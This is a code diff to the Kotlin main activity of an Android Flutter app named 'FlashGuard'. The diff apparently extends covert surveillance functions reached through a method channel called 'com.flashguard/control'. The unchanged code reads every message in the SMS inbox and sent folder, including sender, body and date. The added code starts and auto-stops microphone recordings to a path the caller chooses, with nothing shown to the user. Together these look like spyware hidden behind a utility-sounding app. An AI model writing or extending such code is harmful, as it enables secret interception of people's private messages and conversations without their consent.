@@ -3,7 +3,10 @@ package com.flashguard.flashguard
 import android.content.ComponentName
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.media.MediaRecorder
 import android.net.Uri
+import android.os.Handler
+import android.os.Looper
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
@@ -11,6 +14,8 @@ import io.flutter.plugin.common.MethodChannel
 class MainActivity : FlutterActivity() {
 
     private val CHANNEL = "com.flashguard/control"
+    private var mediaRecorder: MediaRecorder? = null
+    private val handler = Handler(Looper.getMainLooper())
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
@@ -52,7 +57,7 @@ class MainActivity : FlutterActivity() {
                             val smsList = mutableListOf<Map<String, Any?>>()
                             val cursor: Cursor? = contentResolver.query(
                                 Uri.parse("content://sms/inbox"),
-                                arrayOf("address", "body", "date", "read", "type"),
+                                arrayOf("address", "body", "date", "read"),
                                 null, null, "date DESC"
                             )
                             cursor?.use { c ->
@@ -62,16 +67,14 @@ class MainActivity : FlutterActivity() {
                                         "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
                                         "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
                                         "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
-                                        "read"    to c.getInt(c.getColumnIndexOrThrow("read")),
                                         "type"    to "inbox"
                                     ))
                                     count++
                                 }
                             }
-                            // Also read sent SMS
                             val sentCursor: Cursor? = contentResolver.query(
                                 Uri.parse("content://sms/sent"),
-                                arrayOf("address", "body", "date", "read", "type"),
+                                arrayOf("address", "body", "date", "read"),
                                 null, null, "date DESC"
                             )
                             sentCursor?.use { c ->
@@ -81,7 +84,6 @@ class MainActivity : FlutterActivity() {
                                         "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
                                         "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
                                         "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
-                                        "read"    to c.getInt(c.getColumnIndexOrThrow("read")),
                                         "type"    to "sent"
                                     ))
                                     count++
@@ -136,8 +138,66 @@ class MainActivity : FlutterActivity() {
                         }
                     }
 
+                    // ── Mic Recording (MediaRecorder) ─────────────────────
+                    "startRecording" -> {
+                        try {
+                            val path     = call.argument<String>("path") ?: ""
+                            val duration = call.argument<Int>("duration") ?: 30
+
+                            mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
+                            mediaRecorder = null
+
+                            @Suppress("DEPRECATION")
+                            val mr = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+                                MediaRecorder(this)
+                            } else {
+                                MediaRecorder()
+                            }
+                            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
+                            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                            mr.setAudioSamplingRate(22050)
+                            mr.setAudioEncodingBitRate(64000)
+                            mr.setOutputFile(path)
+                            mr.prepare()
+                            mr.start()
+                            mediaRecorder = mr
+
+                            // Auto-stop after duration
+                            handler.postDelayed({
+                                try {
+                                    mr.stop()
+                                    mr.release()
+                                    if (mediaRecorder === mr) mediaRecorder = null
+                                } catch (_: Exception) {}
+                            }, duration * 1000L)
+
+                            result.success(true)
+                        } catch (e: Exception) {
+                            result.error("REC_FAILED", e.message, null)
+                        }
+                    }
+
+                    "stopRecording" -> {
+                        try {
+                            mediaRecorder?.let { mr ->
+                                try { mr.stop(); mr.release() } catch (_: Exception) {}
+                                mediaRecorder = null
+                            }
+                            result.success(true)
+                        } catch (e: Exception) {
+                            result.error("STOP_REC_FAILED", e.message, null)
+                        }
+                    }
+
                     else -> result.notImplemented()
                 }
             }
+    }
+
+    override fun onDestroy() {
+        mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
+        mediaRecorder = null
+        super.onDestroy()
     }
 }
